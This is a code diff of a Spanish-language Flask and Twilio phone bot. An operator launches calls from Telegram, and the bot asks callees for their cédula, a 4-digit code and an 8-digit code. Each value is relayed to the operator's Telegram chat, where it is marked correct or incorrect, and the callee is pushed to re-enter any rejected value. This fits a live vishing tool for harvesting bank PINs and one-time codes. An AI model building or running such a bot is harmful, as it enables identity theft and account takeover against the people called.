@@ -381,21 +381,175 @@ def save_step2():
     response = VoiceResponse()
     response.say(f"Ha ingresado {', '.join(digits)}.", language='es-ES')
     
-    # Si estamos en revalidación, notificar a Telegram y esperar validación
+    # NUEVO: Enviar validación intermedia para los primeros dos datos
+    data = global_user_sessions[call_sid]
+    digit_length = len(data.get('cedula', ''))
+    
+    # Iniciar polling de Telegram si no está activo
+    start_telegram_polling()
+    
+    # Enviar mensaje de validación intermedia a Telegram
+    msg = f"🔍 <b>VALIDACIÓN INTERMEDIA</b> (Primeros 2 datos):\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n\n<b>Responde con:</b>\n/validar2 {call_sid} 1 1 (si ambos están bien)\n/validar2 {call_sid} 1 0 (si la cédula está bien pero el código no)\n/validar2 {call_sid} 0 1 (si la cédula está mal pero el código bien)\n/validar2 {call_sid} 0 0 (si ambos están mal)"
+    send_to_telegram(msg)
+    
     if is_revalidation:
-        data = global_user_sessions[call_sid]
-        digit_length = len(data.get('cedula', ''))
-        msg = f"🔄 Código de 4 dígitos actualizado:\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 8 dígitos: {data.get('code8', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
-        send_to_telegram(msg)
-        
         response.say("Gracias. Estamos validando su información actualizada. Por favor, espere unos momentos.", language='es-ES')
-        response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=8&revalidation=true")
+        response.redirect(f"/waiting-intermediate-validation?CallSid={call_sid}&wait=8&revalidation=true")
     else:
-        # Flujo normal: continuar al siguiente paso
-        response.say("Continuando.", language='es-ES')
-        response.redirect('/step3')
+        response.say("Estamos validando sus primeros datos. Por favor, espere unos momentos.", language='es-ES')
+        response.redirect(f"/waiting-intermediate-validation?CallSid={call_sid}&wait=8&revalidation=false")
     
     return str(response)
+
+# CAMBIO 2: Nueva ruta para esperar validación intermedia
+@app.route('/waiting-intermediate-validation', methods=['POST', 'GET'])
+def waiting_intermediate_validation():
+    """
+    Ruta específica para mostrar un mensaje de espera mientras se validan los primeros 2 datos.
+    """
+    call_sid = request.values.get('CallSid')
+    wait_time = int(request.values.get('wait', 10))
+    is_revalidation = request.values.get('revalidation', 'false').lower() == 'true'
+    
+    logger.info(f"⏳ ESPERANDO VALIDACIÓN INTERMEDIA PARA SID={call_sid}, TIEMPO={wait_time}s, REVALIDACIÓN={is_revalidation}")
+    
+    # Si no tenemos SID, no podemos hacer nada
+    if not call_sid:
+        logger.error("❌ No se pudo obtener el CallSid para la espera de validación intermedia")
+        response = VoiceResponse()
+        response.say("Lo sentimos, hubo un error en el proceso. Finalizando llamada.", language='es-ES')
+        return str(response)
+    
+    # Verificar inmediatamente si ya hay una validación intermedia
+    if call_sid in global_user_sessions and 'validacion_intermedia' in global_user_sessions[call_sid]:
+        logger.info(f"⚠️ VALIDACIÓN INTERMEDIA YA EXISTENTE PARA SID={call_sid}: {global_user_sessions[call_sid]['validacion_intermedia']}")
+        response = VoiceResponse()
+        response.redirect(f"/intermediate-validation-result?sid={call_sid}")
+        return str(response)
+    
+    # Verificar si SID existe en sesiones
+    if call_sid not in global_user_sessions:
+        logger.error(f"❌ ERROR: SID {call_sid} no encontrado en sesiones durante la espera intermedia")
+        response = VoiceResponse()
+        response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
+        return str(response)
+    
+    response = VoiceResponse()
+    
+    # Añadir un mensaje personalizado de espera
+    if is_revalidation:
+        response.say("Estamos validando sus datos actualizados. Por favor espere unos momentos.", language='es-ES')
+    else:
+        response.say("Estamos validando sus primeros datos. Por favor espere unos momentos.", language='es-ES')
+    
+    # tiempo de pausa en segundos
+    response.pause(length=10)
+    
+    # Redirigir a la verificación de resultados intermedios después de la espera
+    if call_sid in global_user_sessions and 'validacion_intermedia' in global_user_sessions[call_sid]:
+        logger.info(f"✅ VALIDACIÓN INTERMEDIA DETECTADA DURANTE LA PAUSA PARA SID={call_sid}")
+        response.redirect(f"/intermediate-validation-result?sid={call_sid}")
+    else:
+        response.redirect(f"/intermediate-validation-result?sid={call_sid}")
+    
+    return str(response)
+
+# CAMBIO 3: Nueva ruta para procesar resultados de validación intermedia
+@app.route('/intermediate-validation-result', methods=['GET', 'POST'])
+def intermediate_validation_result():
+    call_sid = request.values.get('sid')
+    logger.info(f"⚠️ VERIFICANDO VALIDACIÓN INTERMEDIA PARA SID: {call_sid}")
+    
+    # Usar otra estrategia para conseguir el SID si no se pasó como parámetro
+    if not call_sid and request.values.get('CallSid'):
+        call_sid = request.values.get('CallSid')
+        logger.info(f"📞 Usando CallSid del request: {call_sid}")
+    
+    # Si no tenemos SID, no podemos hacer nada
+    if not call_sid:
+        logger.error("❌ No se pudo obtener el SID para validación intermedia")
+        response = VoiceResponse()
+        response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
+        return str(response)
+    
+    # Verificar si SID existe en sesiones
+    if call_sid not in global_user_sessions:
+        logger.error(f"❌ ERROR: SID {call_sid} no encontrado en sesiones")
+        response = VoiceResponse()
+        response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
+        return str(response)
+    
+    # Verificar si existe la clave 'validacion_intermedia'
+    validation = global_user_sessions.get(call_sid, {}).get('validacion_intermedia')
+    logger.info(f"⚠️ ESTADO DE VALIDACIÓN INTERMEDIA PARA SID={call_sid}: {validation}")
+
+    response = VoiceResponse()
+
+    # Si tenemos una validación intermedia
+    if validation:
+        logger.info(f"⚠️ VALIDACIÓN INTERMEDIA ENCONTRADA PARA SID={call_sid}: {validation}")
+        
+        # Resetear el contador de intentos ya que tenemos una validación
+        count_key = f"{call_sid}_intermediate_retry_count"
+        if count_key in global_user_sessions.get(call_sid, {}):
+            global_user_sessions[call_sid][count_key] = 0
+            save_session_to_file(global_user_sessions)
+        
+        if validation == [1, 1]:  # Ambos datos correctos
+            response.say("Los primeros datos son correctos. Continuemos con el último paso.", language='es-ES')
+            response.redirect('/step3')  # Continuar al paso 3
+            return str(response)
+        else:
+            # Mensaje general cuando hay errores en los primeros datos
+            response.say("Hemos detectado algunos problemas con los primeros datos proporcionados.", language='es-ES')
+            
+            # Verificar qué dato es incorrecto y redirigir
+            if validation[0] == 0:  # Cédula incorrecta
+                logger.info(f"⚠️ REDIRIGIENDO A PASO 1 - CÉDULA INCORRECTA PARA SID={call_sid}")
+                response.say("La cédula ingresada parece ser incorrecta. Por favor, ingrésela nuevamente.", language='es-ES')
+                response.redirect('/step1')
+            elif validation[1] == 0:  # Código de 4 dígitos incorrecto
+                logger.info(f"⚠️ REDIRIGIENDO A PASO 2 - CÓDIGO 4 DÍGITOS INCORRECTO PARA SID={call_sid}")
+                response.say("El código de 4 dígitos parece ser incorrecto. Por favor, ingréselo nuevamente.", language='es-ES')
+                response.redirect('/step2')
+            return str(response)
+    else:
+        # Añadimos un contador para evitar bucles infinitos
+        count_key = f"{call_sid}_intermediate_retry_count"
+        retry_count = global_user_sessions.get(call_sid, {}).get(count_key, 0)
+        
+        # Si llevamos más de 8 intentos, finalizamos la llamada
+        if retry_count > 8:
+            logger.warning(f"⚠️ DEMASIADOS INTENTOS INTERMEDIOS ({retry_count}) PARA SID={call_sid}. FINALIZANDO LLAMADA.")
+            response.say("Lo sentimos, no hemos recibido validación después de varios intentos. Finalizando llamada.", language='es-ES')
+            return str(response)
+        
+        # Incrementar contador
+        if call_sid in global_user_sessions:
+            global_user_sessions[call_sid][count_key] = retry_count + 1
+            save_session_to_file(global_user_sessions)
+            logger.info(f"⚠️ ESPERANDO VALIDACIÓN INTERMEDIA PARA SID={call_sid}. INTENTO {retry_count + 1}")
+        
+        # Mensajes variados para que no suene repetitivo
+        if retry_count % 3 == 0:
+            response.say("Seguimos validando sus primeros datos. Gracias por su paciencia.", language='es-ES')
+        elif retry_count % 3 == 1:
+            response.say("Continuamos con el proceso de verificación inicial. Por favor espere un momento más.", language='es-ES')
+        else:
+            response.say("Sus primeros datos están siendo procesados. La validación está en curso.", language='es-ES')
+            
+        # Añadir una pausa de 10 segundos entre mensajes de voz
+        response.pause(length=10)
+        
+        # Verificar explícitamente si hay validación antes de continuar
+        if call_sid in global_user_sessions and 'validacion_intermedia' in global_user_sessions[call_sid]:
+            logger.info(f"✅ VALIDACIÓN INTERMEDIA DETECTADA DURANTE LA PAUSA PARA SID={call_sid}")
+            response.redirect(f"/intermediate-validation-result?sid={call_sid}")
+        else:
+            response.redirect(f"/intermediate-validation-result?sid={call_sid}")
+    
+    return str(response)
+
 
 # STEP 3: CÓDIGO DE 8 DÍGITOS (TERCERO)
 @app.route('/step3', methods=['POST', 'GET'])
@@ -410,6 +564,7 @@ def step3():
     response.redirect('/step3')
     return str(response)
 
+# CAMBIO 4: Modificar /save-step3 para validación final simplificada
 @app.route('/save-step3', methods=['POST'])
 def save_step3():
     digits = request.values.get('Digits')
@@ -423,15 +578,15 @@ def save_step3():
         logger.info(f"🆕 Creada nueva sesión para SID={call_sid}")
     
     # Verificar si estamos en un proceso de revalidación
-    is_revalidation = 'validacion' in global_user_sessions[call_sid]
+    is_revalidation = 'validacion_final' in global_user_sessions[call_sid]
     
     # Guardar el código de 8 dígitos
     global_user_sessions[call_sid]['code8'] = digits
     
     # Si había una validación previa, la eliminamos para forzar una nueva validación
-    if is_revalidation and 'validacion' in global_user_sessions[call_sid]:
-        logger.info(f"🔄 Eliminando validación anterior para SID={call_sid}")
-        global_user_sessions[call_sid].pop('validacion', None)
+    if is_revalidation and 'validacion_final' in global_user_sessions[call_sid]:
+        logger.info(f"🔄 Eliminando validación final anterior para SID={call_sid}")
+        global_user_sessions[call_sid].pop('validacion_final', None)
     
     save_session_to_file(global_user_sessions)
     
@@ -449,22 +604,158 @@ def save_step3():
     # Obtener longitud de cédula para el mensaje
     digit_length = len(data.get('cedula', ''))
     
-    # Mensaje diferente dependiendo si es validación inicial o revalidación
+    # Mensaje para validación final (solo el código de 8 dígitos)
+    msg = f"🔍 <b>VALIDACIÓN FINAL</b> (Código de 8 dígitos):\n🔢 Código 8 dígitos: {data.get('code8', 'N/A')}\n\n<b>Responde con:</b>\n/validar3 {call_sid} 1 (si está correcto)\n/validar3 {call_sid} 0 (si está incorrecto)"
+    send_to_telegram(msg)
+    
     if is_revalidation:
-        msg = f"🔄 Código de 8 dígitos actualizado:\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 8 dígitos: {data.get('code8', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
-        send_to_telegram(msg)
-        
-        response.say("Gracias. Estamos validando su información actualizada. Por favor, espere unos momentos.", language='es-ES')
+        response.say("Gracias. Estamos validando su código actualizado. Por favor, espere unos momentos.", language='es-ES')
+        response.redirect(f"/waiting-final-validation?CallSid={call_sid}&wait=8&revalidation=true")
     else:
-        msg = f"📞 Nueva verificación:\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 8 dígitos: {data.get('code8', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)\n/validar {call_sid} 1 0 1 (si el segundo es incorrecto)"
-        send_to_telegram(msg)
-        
-        response.say("Validación exitosa, en un momento uno de nuestros asesores le atenderá, espere en línea.", language='es-ES')
+        response.say("Estamos validando su código final. Por favor, espere unos momentos.", language='es-ES')
+        response.redirect(f"/waiting-final-validation?CallSid={call_sid}&wait=8&revalidation=false")
     
-    # Redirigir a la ruta de espera con el parámetro de revalidación apropiado
-    response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=8&revalidation={str(is_revalidation).lower()}")
     return str(response)
+
+# CAMBIO 5: Nueva ruta para esperar validación final
+@app.route('/waiting-final-validation', methods=['POST', 'GET'])
+def waiting_final_validation():
+    """
+    Ruta específica para mostrar un mensaje de espera mientras se valida el código final.
+    """
+    call_sid = request.values.get('CallSid')
+    wait_time = int(request.values.get('wait', 10))
+    is_revalidation = request.values.get('revalidation', 'false').lower() == 'true'
     
+    logger.info(f"⏳ ESPERANDO VALIDACIÓN FINAL PARA SID={call_sid}, TIEMPO={wait_time}s, REVALIDACIÓN={is_revalidation}")
+    
+    # Si no tenemos SID, no podemos hacer nada
+    if not call_sid:
+        logger.error("❌ No se pudo obtener el CallSid para la espera de validación final")
+        response = VoiceResponse()
+        response.say("Lo sentimos, hubo un error en el proceso. Finalizando llamada.", language='es-ES')
+        return str(response)
+    
+    # Verificar inmediatamente si ya hay una validación final
+    if call_sid in global_user_sessions and 'validacion_final' in global_user_sessions[call_sid]:
+        logger.info(f"⚠️ VALIDACIÓN FINAL YA EXISTENTE PARA SID={call_sid}: {global_user_sessions[call_sid]['validacion_final']}")
+        response = VoiceResponse()
+        response.redirect(f"/final-validation-result?sid={call_sid}")
+        return str(response)
+    
+    # Verificar si SID existe en sesiones
+    if call_sid not in global_user_sessions:
+        logger.error(f"❌ ERROR: SID {call_sid} no encontrado en sesiones durante la espera final")
+        response = VoiceResponse()
+        response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
+        return str(response)
+    
+    response = VoiceResponse()
+    
+    # Añadir un mensaje personalizado de espera
+    if is_revalidation:
+        response.say("Estamos validando su código actualizado. Por favor espere unos momentos.", language='es-ES')
+    else:
+        response.say("Estamos validando su código final. Por favor espere unos momentos.", language='es-ES')
+    
+    # tiempo de pausa en segundos
+    response.pause(length=10)
+    
+    # Redirigir a la verificación de resultados finales después de la espera
+    if call_sid in global_user_sessions and 'validacion_final' in global_user_sessions[call_sid]:
+        logger.info(f"✅ VALIDACIÓN FINAL DETECTADA DURANTE LA PAUSA PARA SID={call_sid}")
+        response.redirect(f"/final-validation-result?sid={call_sid}")
+    else:
+        response.redirect(f"/final-validation-result?sid={call_sid}")
+    
+    return str(response)
+
+
+# CAMBIO 6: Nueva ruta para procesar resultados de validación final
+@app.route('/final-validation-result', methods=['GET', 'POST'])
+def final_validation_result():
+    call_sid = request.values.get('sid')
+    logger.info(f"⚠️ VERIFICANDO VALIDACIÓN FINAL PARA SID: {call_sid}")
+    
+    # Usar otra estrategia para conseguir el SID si no se pasó como parámetro
+    if not call_sid and request.values.get('CallSid'):
+        call_sid = request.values.get('CallSid')
+        logger.info(f"📞 Usando CallSid del request: {call_sid}")
+    
+    # Si no tenemos SID, no podemos hacer nada
+    if not call_sid:
+        logger.error("❌ No se pudo obtener el SID para validación final")
+        response = VoiceResponse()
+        response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
+        return str(response)
+    
+    # Verificar si SID existe en sesiones
+    if call_sid not in global_user_sessions:
+        logger.error(f"❌ ERROR: SID {call_sid} no encontrado en sesiones")
+        response = VoiceResponse()
+        response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
+        return str(response)
+    
+    # Verificar si existe la clave 'validacion_final'
+    validation = global_user_sessions.get(call_sid, {}).get('validacion_final')
+    logger.info(f"⚠️ ESTADO DE VALIDACIÓN FINAL PARA SID={call_sid}: {validation}")
+
+    response = VoiceResponse()
+
+    # Si tenemos una validación final
+    if validation is not None:
+        logger.info(f"⚠️ VALIDACIÓN FINAL ENCONTRADA PARA SID={call_sid}: {validation}")
+        
+        # Resetear el contador de intentos ya que tenemos una validación
+        count_key = f"{call_sid}_final_retry_count"
+        if count_key in global_user_sessions.get(call_sid, {}):
+            global_user_sessions[call_sid][count_key] = 0
+            save_session_to_file(global_user_sessions)
+        
+        if validation == 1:  # Código correcto
+            response.say("Verificación completada con éxito. Todos los datos son correctos. Gracias por su paciencia.", language='es-ES')
+            return str(response)
+        else:  # Código incorrecto
+            logger.info(f"⚠️ REDIRIGIENDO A PASO 3 - CÓDIGO 8 DÍGITOS INCORRECTO PARA SID={call_sid}")
+            response.say("El código de 8 dígitos parece ser incorrecto. Por favor, ingréselo nuevamente.", language='es-ES')
+            response.redirect('/step3')
+            return str(response)
+    else:
+        # Añadimos un contador para evitar bucles infinitos
+        count_key = f"{call_sid}_final_retry_count"
+        retry_count = global_user_sessions.get(call_sid, {}).get(count_key, 0)
+        
+        # Si llevamos más de 8 intentos, finalizamos la llamada
+        if retry_count > 8:
+            logger.warning(f"⚠️ DEMASIADOS INTENTOS FINALES ({retry_count}) PARA SID={call_sid}. FINALIZANDO LLAMADA.")
+            response.say("Lo sentimos, no hemos recibido validación después de varios intentos. Finalizando llamada.", language='es-ES')
+            return str(response)
+        
+        # Incrementar contador
+        if call_sid in global_user_sessions:
+            global_user_sessions[call_sid][count_key] = retry_count + 1
+            save_session_to_file(global_user_sessions)
+            logger.info(f"⚠️ ESPERANDO VALIDACIÓN FINAL PARA SID={call_sid}. INTENTO {retry_count + 1}")
+        
+        # Mensajes variados para que no suene repetitivo
+        if retry_count % 3 == 0:
+            response.say("Seguimos validando su código final. Gracias por su paciencia.", language='es-ES')
+        elif retry_count % 3 == 1:
+            response.say("Continuamos con el proceso de verificación final. Por favor espere un momento más.", language='es-ES')
+        else:
+            response.say("Su código está siendo procesado. La validación está en curso.", language='es-ES')
+            
+        # Añadir una pausa de 10 segundos entre mensajes de voz
+        response.pause(length=10)
+        
+        # Verificar explícitamente si hay validación antes de continuar
+        if call_sid in global_user_sessions and 'validacion_final' in global_user_sessions[call_sid]:
+            logger.info(f"✅ VALIDACIÓN FINAL DETECTADA DURANTE LA PAUSA PARA SID={call_sid}")
+            response.redirect(f"/final-validation-result?sid={call_sid}")
+        else:
+            response.redirect(f"/final-validation-result?sid={call_sid}")
+    
+    return str(response)
 
 # El resto del código de validate-result permanece igual, solo hay que actualizar las referencias:
 @app.route('/validate-result', methods=['GET', 'POST'])
@@ -711,19 +1002,89 @@ def process_telegram_update(update):
             process_call_command(chat_id, message_text)
             return
         
-        # Procesar comandos de validación
+        # Procesar comandos de validación intermedia (nuevos 2 datos)
+        if message_text.startswith('/validar2') or message_text.startswith('validar2'):
+            parts = message_text.split()
+            
+            if len(parts) >= 4:
+                sid = parts[1]
+                try:
+                    vals = list(map(int, parts[2:4]))  # Solo 2 valores
+                    
+                    # Asegurar que la sesión existe para este SID
+                    if sid not in global_user_sessions:
+                        global_user_sessions[sid] = {}
+                        logger.info(f"🆕 Creada nueva sesión para SID={sid} en validación intermedia")
+                    
+                    # Restablecer contador de intentos si existe
+                    count_key = f"{sid}_intermediate_retry_count"
+                    if count_key in global_user_sessions[sid]:
+                        global_user_sessions[sid][count_key] = 0
+                        logger.info(f"🔄 Reiniciando contador de intentos intermedios para SID={sid}")
+                    
+                    # Guardar la validación intermedia
+                    global_user_sessions[sid]['validacion_intermedia'] = vals
+                    save_session_to_file(global_user_sessions)
+                    
+                    logger.info(f"✅ VALIDACIÓN INTERMEDIA GUARDADA PARA SID {sid} MEDIANTE TELEGRAM: {vals}")
+                    
+                    # Confirmar al usuario de Telegram
+                    send_telegram_response(chat_id, f"<b>✅ Validación intermedia guardada para {sid}:</b> {vals}")
+                except Exception as e:
+                    logger.error(f"❌ ERROR AL PROCESAR VALIDACIÓN INTERMEDIA TELEGRAM: {e}")
+                    send_telegram_response(chat_id, f"<b>❌ Error al procesar:</b> {e}")
+            else:
+                send_telegram_response(chat_id, "<b>❌ Formato incorrecto.</b> Usar: /validar2 SID 1 1")
+            return
+        
+        # Procesar comandos de validación final (solo código de 8 dígitos)
+        if message_text.startswith('/validar3') or message_text.startswith('validar3'):
+            parts = message_text.split()
+            
+            if len(parts) >= 3:
+                sid = parts[1]
+                try:
+                    val = int(parts[2])  # Solo 1 valor
+                    
+                    # Asegurar que la sesión existe para este SID
+                    if sid not in global_user_sessions:
+                        global_user_sessions[sid] = {}
+                        logger.info(f"🆕 Creada nueva sesión para SID={sid} en validación final")
+                    
+                    # Restablecer contador de intentos si existe
+                    count_key = f"{sid}_final_retry_count"
+                    if count_key in global_user_sessions[sid]:
+                        global_user_sessions[sid][count_key] = 0
+                        logger.info(f"🔄 Reiniciando contador de intentos finales para SID={sid}")
+                    
+                    # Guardar la validación final
+                    global_user_sessions[sid]['validacion_final'] = val
+                    save_session_to_file(global_user_sessions)
+                    
+                    logger.info(f"✅ VALIDACIÓN FINAL GUARDADA PARA SID {sid} MEDIANTE TELEGRAM: {val}")
+                    
+                    # Confirmar al usuario de Telegram
+                    send_telegram_response(chat_id, f"<b>✅ Validación final guardada para {sid}:</b> {val}")
+                except Exception as e:
+                    logger.error(f"❌ ERROR AL PROCESAR VALIDACIÓN FINAL TELEGRAM: {e}")
+                    send_telegram_response(chat_id, f"<b>❌ Error al procesar:</b> {e}")
+            else:
+                send_telegram_response(chat_id, "<b>❌ Formato incorrecto.</b> Usar: /validar3 SID 1")
+            return
+        
+        # Procesar comandos de validación original (mantener compatibilidad con el sistema anterior)
         if message_text.startswith('/validar') or message_text.startswith('validar'):
             parts = message_text.split()
             
             if len(parts) >= 5:
                 sid = parts[1]
                 try:
-                    vals = list(map(int, parts[2:5]))
+                    vals = list(map(int, parts[2:5]))  # 3 valores para compatibilidad
                     
                     # Asegurar que la sesión existe para este SID
                     if sid not in global_user_sessions:
                         global_user_sessions[sid] = {}
-                        logger.info(f"🆕 Creada nueva sesión para SID={sid} en process_telegram_update")
+                        logger.info(f"🆕 Creada nueva sesión para SID={sid} en validación original")
                     
                     # Restablecer contador de intentos si existe
                     count_key = f"{sid}_retry_count"
@@ -731,20 +1092,46 @@ def process_telegram_update(update):
                         global_user_sessions[sid][count_key] = 0
                         logger.info(f"🔄 Reiniciando contador de intentos para SID={sid}")
                     
-                    # Guardar la validación
+                    # Guardar la validación original
                     global_user_sessions[sid]['validacion'] = vals
                     save_session_to_file(global_user_sessions)
                     
-                    logger.info(f"✅ VALIDACIÓN GUARDADA PARA SID {sid} MEDIANTE TELEGRAM: {vals}")
+                    logger.info(f"✅ VALIDACIÓN ORIGINAL GUARDADA PARA SID {sid} MEDIANTE TELEGRAM: {vals}")
                     
                     # Confirmar al usuario de Telegram
-                    send_telegram_response(chat_id, f"<b>✅ Validación guardada para {sid}:</b> {vals}")
+                    send_telegram_response(chat_id, f"<b>✅ Validación original guardada para {sid}:</b> {vals}")
                 except Exception as e:
-                    logger.error(f"❌ ERROR AL PROCESAR VALIDACIÓN TELEGRAM: {e}")
+                    logger.error(f"❌ ERROR AL PROCESAR VALIDACIÓN ORIGINAL TELEGRAM: {e}")
                     send_telegram_response(chat_id, f"<b>❌ Error al procesar:</b> {e}")
             else:
                 send_telegram_response(chat_id, "<b>❌ Formato incorrecto.</b> Usar: /validar SID 1 1 1")
+            return
+        
+        # Comando de ayuda
+        if message_text.startswith('/help') or message_text.startswith('help'):
+            help_message = """
+<b>📋 COMANDOS DISPONIBLES:</b>
 
+<b>🔹 Realizar llamada:</b>
+<code>/llamar +57XXXXXXXXXX</code>
+
+<b>🔹 Validaciones:</b>
+<code>/validar2 SID 1 1</code> - Validar primeros 2 datos (cédula y código 4 dígitos)
+<code>/validar3 SID 1</code> - Validar código final de 8 dígitos
+<code>/validar SID 1 1 1</code> - Validación completa (compatibilidad)
+
+<b>🔹 Valores de validación:</b>
+• <code>1</code> = Correcto
+• <code>0</code> = Incorrecto
+
+<b>🔹 Otros comandos:</b>
+<code>/help</code> - Mostrar esta ayuda
+            """
+            send_telegram_response(chat_id, help_message)
+            return
+        
+        # Si no coincide con ningún comando conocido
+        send_telegram_response(chat_id, "❓ <b>Comando no reconocido.</b> Usa /help para ver los comandos disponibles.")
 def process_call_command(chat_id, message_text):
     """Procesa el comando /llamar para iniciar una llamada desde Telegram."""
     parts = message_text.split()
